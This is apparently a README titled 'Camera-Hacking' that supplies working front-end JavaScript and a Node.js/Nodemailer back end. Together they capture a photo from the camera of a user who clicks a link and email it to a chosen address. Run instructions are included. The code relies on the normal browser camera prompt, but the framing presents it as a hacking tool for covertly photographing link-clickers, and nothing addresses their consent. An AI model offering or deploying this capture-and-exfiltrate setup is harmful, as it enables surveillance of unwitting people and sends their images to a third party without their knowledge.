# Camera-Hacking
a system that takes a photo from the user's camera when they click a link and then sends that photo to a specified email involves several components, including front-end and back-end development.

Front-End: HTML and JavaScript to capture the photo using the user's camera.
Back-End: A server to handle the photo upload and send the email.

# Front-End Code
This code will prompt the user to take a photo using their device's camera.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Capture Photo</title>
</head>
<body>
    <h1>Capture a Photo</h1>
    <button id="capture-btn">Capture Photo</button>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture-btn');

        // Get access to the camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                console.error("Error accessing the camera: " + err);
            });

        captureBtn.addEventListener('click', () => {
            // Draw the video frame to the canvas
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the canvas image to a data URL
            const dataURL = canvas.toDataURL('image/png');

            // Send the data URL to the server
            fetch('/upload', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ image: dataURL })
            })
            .then(response => response.json())
            .then(data => {
                alert('Photo sent successfully!');
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
```

## Back-End Code
This example uses Node.js with Express and Nodemailer to handle the upload and send the email.

# Install necessary packages:

```base
npm install express body-parser nodemailer
```
# Server code (server.js):

```js
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const port = 3000;

app.use(bodyParser.json({ limit: '10mb' }));

app.post('/upload', (req, res) => {
    const imageData = req.body.image;

    // Extract the base64 data
    const base64Data = imageData.replace(/^data:image\/png;base64,/, '');

    // Convert the base64 string to a buffer
    const imageBuffer = Buffer.from(base64Data, 'base64');

    // Email configuration
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'your-email@gmail.com',
            pass: 'your-email-password'
        }
    });

    const mailOptions = {
        from: 'your-email@gmail.com',
        to: 'admin-email@example.com',
        subject: 'Photo from user',
        text: 'Here is the photo captured by the user.',
        attachments: [
            {
                filename: 'photo.png',
                content: imageBuffer
            }
        ]
    };

    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            res.status(500).json({ success: false, message: 'Error sending email' });
        } else {
            console.log('Email sent:', info.response);
            res.json({ success: true, message: 'Email sent successfully' });
        }
    });
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
```

Steps to Run the Application
Create the Front-End File: Save the front-end HTML and JavaScript code in a file named index.html.
Create the Server File: Save the back-end JavaScript code in a file named server.js.
Install Dependencies: Run npm install express body-parser nodemailer to install the necessary Node.js packages.
Start the Server: Run node server.js to start the server.
Open the Front-End: Open index.html in a web browser. Ensure the browser has permission to use the camera.

This solution will capture a photo when the user clicks the "Capture Photo" button, send it to the server, and the server will email the photo to the specified email address. Make sure to replace the email credentials and recipient email address with your actual data.
